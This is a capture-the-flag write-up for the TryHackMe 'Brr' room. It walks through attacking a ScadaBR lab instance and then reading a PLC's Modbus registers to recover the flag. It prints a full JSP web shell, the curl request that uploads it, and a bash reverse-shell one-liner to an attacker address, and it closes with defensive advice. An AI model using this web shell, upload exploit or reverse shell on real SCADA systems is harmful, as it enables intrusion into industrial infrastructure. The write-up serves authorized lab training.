# Brr — TryHackMe Writeup

**Platform:** TryHackMe  
**Room:** Brr  
**Category:** ICS/OT  
**Target:** Lab containers running ScadaBR and a Modbus PLC

> This walkthrough is for the authorized TryHackMe room only. Replace `<TARGET_IP>` and `<ATTACKER_IP>` with values from your active lab. Do not test these techniques against real industrial systems without explicit authorization and a defined safety plan.

## Overview

Brr is an ICS/OT-focused room built around ScadaBR and a Modbus PLC. The objective is not a conventional filesystem flag hunt: the flag is stored in Modbus data.

Recorded attack chain:

1. Enumerate the target and identify ScadaBR.
2. Authenticate to the lab application using the room's supplied/default credentials.
3. Abuse the vulnerable ScadaBR upload functionality to obtain JSP execution.
4. Use the resulting shell inside the application container.
5. Discover the PLC through Docker's internal name resolution.
6. Query Modbus TCP holding registers and decode the returned data.

## 1. Reconnaissance

```bash
rustscan -a <TARGET_IP> --range 1-65535 --ulimit 5000 -- -sV -sC -Pn
```

Ports observed in the recorded room instance:

| Port | Service | Notes |
|---|---|---|
| 22 | SSH | Not used for initial access |
| 80 | WebSockify | noVNC proxy |
| 5020 | Modbus TCP | PLC service |
| 5901 | VNC | Remote desktop |
| 8080 | Apache Tomcat | ScadaBR web application |

The service list is specific to the recorded instance and may differ between room deployments.

## 2. Web enumeration and authentication

The application redirected from `/` to `/ScadaBR`, then to `login.htm`.

```bash
curl -i -L http://<TARGET_IP>:8080/ScadaBR/login.htm
```

The room instance accepted the default credentials used in the lab:

```bash
curl -i -c cookies.txt -b cookies.txt -L \
  -d "username=admin&password=admin" \
  http://<TARGET_IP>:8080/ScadaBR/login.htm
```

The response redirected to `watch_list.shtm` and issued a `JSESSIONID`.

The Data Sources page exposed this configuration:

| Field | Value |
|---|---|
| Name | `secret` |
| Type | Modbus IP |
| Host | `plc` |
| Port | `5020` |
| Slave ID | 1 |
| Point | Binary, offset 0/0 |

This provided a useful lead for the later OT protocol investigation.

## 3. ScadaBR upload vulnerability and JSP execution

The room's ScadaBR instance exposed a graphical-view background-image upload feature through `view_edit.shtm`. In the vulnerable lab configuration, the upload handling allowed a JSP file to be placed at a location served by Tomcat.

The original lab exercise associates this behavior with **CVE-2021-26828**. CVE attribution should always be checked against the affected product version and the exact vulnerable code path; the observation in this room is evidence of the lab behavior, not proof that every ScadaBR installation is affected.

### JSP command-execution proof of concept

The following minimal JSP was used in the isolated room:

```jsp
<%@ page import="java.util.*,java.io.*"%>
<%
  String cmd = request.getParameter("cmd");
  if (cmd != null) {
    Process p = Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",cmd});
    BufferedReader in = new BufferedReader(new InputStreamReader(p.getInputStream()));
    String line;
    while ((line = in.readLine()) != null) {
      out.println(line);
    }
  }
%>
```

Upload request:

```bash
curl -i -b cookies.txt -X POST \
  -F "view.name=pwn" \
  -F "view.xid=GV_pwn" \
  -F "backgroundImageMP=@brr.jsp;type=application/octet-stream" \
  -F "upload=Upload image" \
  http://<TARGET_IP>:8080/ScadaBR/view_edit.shtm
```

The response HTML exposed an upload path similar to:

```html
<img id="viewBackground" src="uploads/1.jsp" ... />
```

### Verify execution

```bash
curl -i "http://<TARGET_IP>:8080/ScadaBR/uploads/1.jsp?cmd=id"
```

The recorded response showed:

```text
uid=107(tomcat7) gid=110(tomcat7) groups=110(tomcat7),20(dialout)
```

This confirmed command execution in the context of the Tomcat service account inside the lab container.

The `dialout` group is associated with access to serial devices on many Linux systems, but group membership alone does not prove that a particular serial device or PLC is accessible. In this room, the Modbus data-source configuration and subsequent network tests provide the stronger evidence of PLC reachability.

## 4. Obtain an interactive shell

The recorded lab used a URL-encoded reverse-shell command. Start a listener on the attacker system:

```bash
nc -lvnp 4444
```

Generate an encoded payload, substituting the VPN-reachable attacker address:

```bash
python3 - <<'PY'
import urllib.parse

payload = "bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'"
print(urllib.parse.quote(payload, safe=""))
PY
```

Trigger the request from the attacker machine:

```bash
curl "http://<TARGET_IP>:8080/ScadaBR/uploads/1.jsp?cmd=<ENCODED_PAYLOAD>"
```

The recorded shell ran as `tomcat7`.

If the callback does not arrive, verify that the listener is bound to the correct interface and that the target can route to the VPN-reachable attacker address. A VPN running inside a VM and a listener running on the host can have different reachable addresses; moving the VPN is not universally required.

## 5. Discover the PLC from the container

The shell environment exposed Docker-related indicators, including `/.dockerenv`. The container's recorded address was `172.20.0.3` on a `/16` bridge.

Docker's internal DNS resolved the configured service name:

```bash
getent hosts plc
# 172.20.0.2 plc
```

This showed that the name `plc` resolved to a peer container on the lab network. It was a more useful lead than searching the application container's filesystem for a flag.

No relevant flag file was found with:

```bash
find / -name "*flag*" -o -name "user.txt" -o -name "root.txt" 2>/dev/null
```

Python 3 was available in the container, so the Modbus request could be constructed using the standard `socket` and `struct` modules.

## 6. Modbus TCP

A Modbus TCP Application Data Unit consists of an MBAP header followed by a Protocol Data Unit (PDU):

```text
[Transaction ID: 2B]
[Protocol ID:     2B]
[Length:          2B]
[Unit ID:         1B]
[Function + Data: variable]
```

Relevant function codes:

| Function | Meaning |
|---|---|
| `0x01` | Read Coils |
| `0x02` | Read Discrete Inputs |
| `0x03` | Read Holding Registers |
| `0x04` | Read Input Registers |

### Test: read coils

```python
import socket
import struct

pdu = struct.pack(">BHH", 0x01, 0, 8)
mbap = struct.pack(">HHHB", 1, 0, len(pdu) + 1, 1)

with socket.create_connection(("plc", 5020), timeout=5) as sock:
    sock.sendall(mbap + pdu)
    response = sock.recv(1024)

print(response.hex())
```

The recorded response PDU was `010100`: function code `01`, byte count `01`, and one data byte with all requested coil bits cleared.

### Read holding registers robustly

TCP is a byte stream. A single `recv(n)` call may return fewer than `n` bytes, so the client must read the complete MBAP header and the number of bytes declared by its Length field.

```python
import socket
import struct


def recv_exact(sock, size):
    """Read exactly size bytes or raise if the peer closes early."""
    chunks = []
    remaining = size

    while remaining:
        chunk = sock.recv(remaining)
        if not chunk:
            raise ConnectionError("Peer closed before the full Modbus frame arrived")
        chunks.append(chunk)
        remaining -= len(chunk)

    return b"".join(chunks)


def modbus_read(unit, function, start, count, txid=1, host="plc", port=5020):
    pdu = struct.pack(">BHH", function, start, count)
    mbap = struct.pack(">HHHB", txid, 0, len(pdu) + 1, unit)

    with socket.create_connection((host, port), timeout=5) as sock:
        sock.settimeout(5)
        sock.sendall(mbap + pdu)

        # MBAP header is 7 bytes, including Unit ID.
        header = recv_exact(sock, 7)
        response_txid, protocol_id, length, response_unit = struct.unpack(">HHHB", header)

        if response_txid != txid:
            raise ValueError("Unexpected transaction ID")
        if protocol_id != 0:
            raise ValueError("Unexpected Modbus protocol ID")
        if response_unit != unit:
            raise ValueError("Unexpected unit ID")
        if length < 2:
            raise ValueError("Invalid Modbus length")

        # Length counts Unit ID plus PDU; Unit ID was already read in header.
        response_pdu = recv_exact(sock, length - 1)

    if response_pdu[0] == (function | 0x80):
        raise RuntimeError(f"Modbus exception response: {response_pdu.hex()}")
    if response_pdu[0] != function:
        raise ValueError(f"Unexpected function code: {response_pdu[0]:02x}")

    return response_pdu


response = modbus_read(unit=1, function=0x03, start=0, count=20)
print(response.hex())
```

The recorded response began:

```text
032800540048004d007b006d006f0064006200750073005f006800690064007d00...
```

The PDU starts with function code `03` and byte count `28` (40 decimal). The remaining data contains 20 two-byte registers. In this challenge's data representation, the ASCII character is in the low byte of each register.

Decode the low bytes:

```python
# response is the Modbus response PDU returned by modbus_read().
byte_count = response[1]
register_data = response[2:2 + byte_count]

if len(register_data) != byte_count or byte_count % 2:
    raise ValueError("Unexpected register data length")

decoded = bytes(register_data[i + 1] for i in range(0, byte_count, 2))
print(decoded.decode("ascii"))
```

The decoded challenge value was:

```text
THM{modbus_hid}
```

## Flag

```text
THM{modbus_hid}
```

## Attack-chain summary

```text
Attacker
  |
  v
ScadaBR on :8080
  |
  v
Authenticated upload path in the vulnerable lab instance
  |
  v
JSP command execution as tomcat7 inside the container
  |
  v
Docker DNS resolves plc
  |
  v
plc:5020 (Modbus TCP)
  |
  v
Read holding registers (function 0x03)
  |
  v
Decode register data -> THM{modbus_hid}
```

## Takeaways

- Check for default credentials in authorized lab environments, but never assume they are present in production.
- Validate upload handling at both the application and storage layers. Uploaded content should not be executable by the web server.
- Confirm container context and enumerate reachable services from the actual shell environment.
- Docker service-name resolution can reveal peer services on a shared network.
- Modbus TCP is straightforward to inspect with raw sockets, but correct framing matters: TCP reads can be partial.
- Do not infer device access from a Linux group name alone; validate reachability and permissions with direct evidence.

## Defensive recommendations

- Replace default credentials and enforce strong authentication.
- Patch affected ScadaBR deployments and verify the exact CVE applicability against the deployed version.
- Store uploads outside executable web roots; validate content server-side and serve uploaded files with non-executable content handling.
- Restrict container-to-container network access to required flows.
- Segment OT networks and restrict Modbus TCP access to explicitly authorized hosts.
- Monitor unexpected application child processes, outbound connections, and changes to uploaded content.
